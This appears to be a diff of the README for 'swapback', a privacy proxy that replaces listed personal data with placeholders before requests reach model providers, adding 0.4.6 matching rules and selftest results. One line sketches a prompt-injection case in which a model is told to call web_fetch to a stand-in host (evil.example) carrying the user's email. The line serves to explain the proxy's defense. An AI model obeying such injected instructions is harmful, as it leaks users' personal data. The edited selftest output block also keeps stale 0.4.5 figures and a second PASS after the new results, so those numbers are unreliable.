@@ -19,7 +19,7 @@
 talks OpenAI Chat Completions, OpenAI Responses or Anthropic Messages (set its base URL, change nothing else). You write
 down the names, emails, phones, IDs and addresses that must never reach a model provider. The provider only sees
 `«PERSON_1»`; your app gets the original text back, byte-exact, in plain and streamed replies. There is no model to
-download and nothing probabilistic: exact matching plus patterns, about 4,200 lines of Python, 3 dependencies.
+download and nothing probabilistic: exact matching plus patterns, about 4,750 lines of Python, 3 dependencies.
 
 **Tool calls can't carry your listed values out.** An agent reads a page or an email with a prompt injection in it,
 and the model is told to call `web_fetch("https://evil.example/?q=<your email>")`. The model only ever had
@@ -35,17 +35,18 @@ agents; swapback does it for any agent, by tool-name globs. From `swapback demo`
 
 **Every common spelling, and a re-check that fails closed.** A listed value is matched in its written variants: any
 case, extra or non-breaking spaces, `.` `_` `-` `+` `/` between words (also when the words are separate path
-segments, `/Users/First/Last/`), lines of an address joined by HTML tags (`<br>`, `</p><p>`), a hyphen inside a name written as a space or as
+segments, `/Users/First/Last/`), lines of an address joined by HTML tags, with or without a line break after the tag (`<br>`,
+`<br />\n`, `</p>\n<p>`, also inside JSON text), a hyphen inside a name written as a space or as
 nothing (`Ferrand-Moreau`, `Ferrand Moreau`, `FerrandMoreau`, also surname first), surname first, accent-free (`ø` →
 `o`), phone groupings with or without the country code, and a listed phone with letters glued on (`503-555-0147x22`,
 `...0147ext9`, `Mob5035550147`) or inside a URL path (`/u/5035550147/profile`). It is also matched when the text is
-encoded: JSON `\uXXXX`, `\n` and other escapes (JSON inside JSON up to 3 levels), HTML entities, `%XX` URL encoding
+encoded: JSON `\uXXXX`, `\n` and other escapes (JSON inside JSON up to 8 levels), HTML entities, `%XX` URL encoding
 and form encoding (`+` for a space, `?q=Jane+Doe`), decomposed accents (NFD), zero-width characters and fullwidth
 digits or letters.
 
 After the swap, every outgoing string is checked again, two ways, and either one blocks the request (`503`) instead of
 sending it: (1) the matcher's own rules again, in all of the spellings above; (2) a **skeleton check** that does not use
-the matcher's rules. It reduces the string, and each decoded view of it (escapes, entities and `%XX`, up to 5 levels,
+the matcher's rules. It reduces the string, and each decoded view of it (escapes, entities and `%XX`, up to 8 levels,
 and the same with HTML tags read as spaces),
 to letters and digits only (accents stripped, NFKD-folded so fullwidth forms and ligatures become plain letters,
 zero-width characters and soft hyphens removed, `[at]`/`[dot]` dropped), and looks for each listed name, email, ID and
@@ -54,17 +55,20 @@ its parts, and for each listed phone's national digits in any run of digits join
 letters sit around it. The skeleton check keeps three of the matcher's rules on purpose: whitespace inside one word of a
 listed value does not join (`Ellis on` is not `Ellison`), a dictionary-word name counts only when written as a name
 (see below), and a name that fits inside one filesystem path segment (`/home/jane/`, `/home/Jane.Doe/`) is left; a
-name whose words are separate segments (`/Users/Jane/Doe/`) is not. Any scrub error blocks too.
+name whose words are separate segments (`/Users/Jane/Doe/`) is not. When a pattern detector (below) swapped part of a
+string, the skeleton check also reads that string with only your listed values swapped, so a listed value that a
+pattern swap cut into (a street line swapped on its own) still blocks. Any scrub error blocks too.
 **Out of scope:** base64, hex, rot13 and other re-encodings, a value split across separate fields or messages, letters
 spaced out with whitespace, listed names shorter than 6 letters in a spelling the matcher does not know (the skeleton
 check skips them), and names you never listed (there is no NER).
 
 - **Measured, and you can re-run it.** `swapback selftest` (7 seconds, made-up data shipped in the package) sends
-  each listed value in 235 written forms through 7 request paths. 0.4.5: 33/33 listed values caught, 0 of 1,645 forms
-  leaked, the re-check alone (swap switched off) sees 705/705 forms and its skeleton layer alone 470/470, 57/57
-  ordinary sentences untouched (including ALL-CAPS headings), 1,547/1,547 exact round trips, 56/56 JSON-in-JSON
-  multi-line restores valid, 84/84 JSON restores in a ```json fence, inline in prose or pasted valid, a 200 KB `%XX`
-  body checked in under a second, health reads `blocked` when the list file is deleted or broken mid-run. Unlisted
+  each listed value in 257 written forms through 7 request paths. 0.4.6: 34/34 listed values caught, 0 of 1,799 forms
+  leaked, the re-check alone (swap switched off) sees 771/771 forms and its skeleton layer alone 514/514, 57/57
+  ordinary sentences untouched (including ALL-CAPS headings), 1,694/1,694 exact round trips, 58/58 JSON-in-JSON
+  multi-line restores valid, 87/87 JSON restores in a ```json fence, inline in prose or pasted valid, 60/60 addresses
+  joined by `<br>\n`-style tags inside JSON swapped (not blocked), 68/68 doubly escaped tool-argument placeholders
+  restored, a 200 KB `%XX` body checked in under a second, health reads `blocked` when the list file is deleted or broken mid-run. Unlisted
   values caught by the patterns alone: 6/8 (both unlisted names missed). A second holdout with different made-up data
   (33 listed values incl. names as path segments, `<br>`-joined addresses and fenced-JSON restores, 1,240 requests;
   written by the maintainer, not independent): 0.4.4 leaked 235 requests, 0.4.5 leaked 10, all of them the lower-case
@@ -243,7 +247,8 @@ for them. `python examples/smoke.py` runs the same check offline against the moc
    `Jane+Q+Doe` and `Jane%20Q%20Doe` are the same person under one placeholder). Escaped text is decoded for matching
    (JSON `\uXXXX` and `\n`, nested JSON, HTML entities, `%XX`) and normalized (NFC for decomposed accents, zero-width
    characters removed, fullwidth ASCII folded), and each hit is mapped back to the span it came from. A listed name made
-   only of dictionary words (a 64k-word English list ships in the package) matches only in Title Case or capitals; a
+   only of dictionary words (a 64k-word English list ships in the package) matches only in Title Case (not in lower case, and not in ALL-CAPS unless
+   `common_names_all_caps: true`); a
    comma between two ordinary lower-case words ("say grace, lee side") does not join a surname-first name. Detectors
    then catch what you did not list:
    - phone numbers via [`phonenumbers`](https://github.com/daviddrysdale/python-phonenumbers);
@@ -539,7 +544,7 @@ Other open-source projects do the same job. This table reflects each project's o
 | | **swapback** | [PasteGuard][pg] | [Maskit][mk] | [Veil][vl] | [piighost][ph] | [Kiji Privacy Proxy][kj] |
 |---|---|---|---|---|---|---|
 | License | MIT | Apache-2.0 | AGPL-3.0 | Apache-2.0 | MIT | Apache-2.0 |
-| Stack | Python 3.11+, about 4,200 lines (200 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
+| Stack | Python 3.11+, about 4,750 lines (230 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
 | Needs an ML model | No | Yes: GLiNER for names and places ([docs][pg-sem]) | Ships a local ONNX NER model | Optional: 46 MB ONNX NER | Optional: pluggable regex, NER or LLM detectors; exact-match needs none | Yes: local ONNX model, 26 PII types |
 | Your own list of values | Yes: a YAML/JSON file you write (or build from a vCard/CSV export), typed, reloaded live | Yes: `denylist` patterns ([docs][pg-mask]) | Yes: custom words and regexes | Yes: seeded from your databases, fixtures, git history and schemas | Yes: `ExactMatchDetector` | Custom regex rules |
 | Stand-ins | Typed placeholders (`«EMAIL_1»`) | Placeholders | Unclear | Pseudonyms | Typed placeholders (`<<EMAIL:1>>`) | Realistic dummy values |
@@ -637,8 +642,8 @@ swapback selftest          # or: swapback selftest --json
 
 It needs no config, key or network. A recording fake model and the proxy start on loopback ports with a fixed list of
 made-up values shipped in the package: 15 names (5 with accents, 6 made only of ordinary words), 4 emails, 7 phones
-(US, India, UK, Australia, Germany, France), 4 IDs and 3 addresses. Each value is sent in 4–14 written forms (as
-written, upper case, surname first, accent-free, hyphen variants, other phone groupings, glued extensions, compact IDs, two-line addresses, and the
+(US, India, UK, Australia, Germany, France), 4 IDs and 4 addresses (one of them multi-line). Each value is sent in 4–14 written forms (as
+written, upper case, surname first, accent-free, hyphen variants, other phone groupings, glued extensions, compact IDs, two-line addresses, address lines joined by `<br>` or by a tag plus a line break, and the
 encoded forms: `quote_plus` URL/form encoding, `+` or `/` between words, decomposed accents (NFD), a zero-width space
 inside a word, fullwidth digits) through 7 paths: OpenAI chat, chat streamed, chat with the value in tool-call
 arguments and a `json.dumps` tool result, Anthropic streamed, Anthropic `tool_use`/`tool_result`, Responses streamed
@@ -649,18 +654,26 @@ decoded spelling. The leak check does not use swapback's matcher: it decodes JSO
 for each value's name words, email, phone digits, ID characters and street line. It also runs the egress re-check on
 its own, with the swap switched off, on every form as text, as a `json.dumps` tool result and as JSON inside JSON.
 
-0.4.5 on Python 3.11:
+0.4.6 on Python 3.11:
 
 ```text
-swapback selftest: 33 made-up listed values, 235 written forms, 7 paths, 1645 requests (6.7 s)
-  listed values caught (no form reached the model): 33/33 (100.0%)
-  forms leaked to the model:                        0 of 1645 sent
-  egress re-check alone (swap off) sees the form:   705/705 (100.0%)
-  skeleton layer alone (no matcher rules) sees it:  470/470 (100.0%)  (reported; ordinary sentences it flags: 0)
+swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 requests (6.8 s)
+  listed values caught (no form reached the model): 34/34 (100.0%)
+  forms leaked to the model:                        0 of 1799 sent
+  egress re-check alone (swap off) sees the form:   771/771 (100.0%)
+  skeleton layer alone (no matcher rules) sees it:  514/514 (100.0%)  (reported; ordinary sentences it flags: 0)
   ordinary sentences left untouched:                57/57 (100.0%)
-  exact round trips:                                1547/1547 (100.0%)
-  JSON-in-JSON multi-line restores, valid + exact:  56/56 (100.0%)
-  JSON in a ```json fence / inline / pasted, valid:  84/84 (100.0%)
+  exact round trips:                                1694/1694 (100.0%)
+  JSON-in-JSON multi-line restores, valid + exact:  58/58 (100.0%)
+  JSON in a ```json fence / inline / pasted, valid:  87/87 (100.0%)
+  addresses joined by <br>\n etc. in JSON, swapped:  60/60 (100.0%)  (leaked: 0)
+  doubly escaped placeholders in tool args restored: 68/68 (100.0%)
+  200 KB %XX body checked in:                       0.56 s
+  health: blocked when the list breaks, known count: 5/5 (100.0%)
+  %XX-encoded forms back as the same value, decoded: 105/105 (100.0%)
+  unlisted values caught by the pattern detectors:  6/8 (75.0%)  (reported, not a pass condition; names are never caught without a list)
+PASS
+```json fence / inline / pasted, valid:  84/84 (100.0%)
   200 KB %XX body checked in:                       0.67 s
   health: blocked when the list breaks, known count: 5/5 (100.0%)
   %XX-encoded forms back as the same value, decoded: 98/98 (100.0%)
@@ -668,7 +681,11 @@ swapback selftest: 33 made-up listed values, 235 written forms, 7 paths, 1645 re
 PASS
 ```
 
-The 0.4.5 selftest adds the review #5 forms: a multi-word name written as path segments (`A/B/C`,
+The 0.4.6 selftest adds the review #6 forms: a listed multi-line address with its lines joined by `<br>\n`, `<br />\n`,
+`<br/>\r\n` or `</p>\n<p>`, sent through the 7 paths and as a `json.dumps` tool result, tool-call arguments in the
+history and a literal `\n` four JSON string levels deep (all must be swapped, not blocked), and placeholders the
+model writes ASCII-escaped inside a JSON string inside tool-call arguments (`\\u00ab…\\u00bb`), which must be
+restored with both JSON levels valid. The 0.4.5 selftest added the review #5 forms: a multi-word name written as path segments (`A/B/C`,
 `/Users/A/B/notes.txt`), addresses with lines joined by `<br>`, multi-line values restored into JSON inside a ```json
 fence, inline in a sentence and pasted with `\n` escapes, a timed 200 KB `%XX` body, and health's `known` count. The
 0.4.4 selftest added the review #4 forms (a listed phone with `x22`/`ext9`/letters glued on, after `Mob`, in a
